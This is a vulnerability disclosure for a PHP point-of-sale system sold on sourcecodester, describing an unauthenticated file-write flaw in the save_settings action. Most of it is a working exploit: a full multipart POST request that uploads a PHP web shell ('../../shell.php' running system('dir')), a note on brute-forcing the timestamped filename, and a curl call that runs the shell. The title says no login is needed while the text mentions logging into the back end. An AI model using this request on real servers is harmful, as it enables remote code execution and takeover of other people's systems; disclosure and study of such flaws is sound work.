# Best pos management system in php V1.0 - Broken Access Control

### You do not need to log in and open the website storage directory

Supplier:https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

http://localhost/ajax.php?action=save_settings   -----> POST request ----->  'filename' can control some filename parameters

Vulnerability location: There is a save_settings function in the root directory of the website's admin_class.php file, which causes any file to be written. This function is triggered by the 'action' parameter of save_settings passed in from the ajax.php file.

Web function point, after logging into the background, System Settings ->Image

Source code location: line 165 of the admin_class.php file in the root path.

![2](/img/Best-pos-management-system-in-php/11.png)

POST:
```
POST /ajax.php?action=save_settings HTTP/1.1
Host: www.kruxton.com:8083
Content-Type: multipart/form-data; boundary=---------------------------988021490109555064829866363
Content-Length: 685

-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="name"

5
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="email"

3@gmail.com
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="contact"

2
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="about"

1113
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="img"; filename="../../shell.php"
Content-Type: image/png

<?php system("dir");
-----------------------------988021490109555064829866363--
```

![3](/img/Best-pos-management-system-in-php/12.png)

Analyze the source code and name the uploaded file as timestamp+_+file name, which can be brute force cracked to obtain the file name.

![5](/img/Best-pos-management-system-in-php/14.png)

```cli
curl "http://www.xxxxx.com/assets/uploads/1709986620_shell.php"
```

![4](/img/Best-pos-management-system-in-php/13.png)

Successfully executed dir command!
